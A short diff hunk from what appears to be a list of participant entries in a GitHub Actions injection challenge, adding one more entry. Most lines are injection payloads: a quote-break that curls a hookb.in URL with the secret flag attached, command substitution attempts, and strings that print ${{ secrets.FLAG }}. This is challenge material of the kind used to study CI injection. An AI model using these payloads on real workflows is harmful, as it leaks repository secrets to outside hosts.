@@ -722,3 +722,4 @@ wgblikeW:a"; set +e; curl https://hookb.in/JKeNn2JXXLig0l9902wn?flag=$flag;#
 Zeker62:${{ github.event.issue.number }} $( flag )
 ";echo ls"
 coderjingluo:${{ secrets.FLAG }}
+wffx:echo ${{secrets.FLAG}}
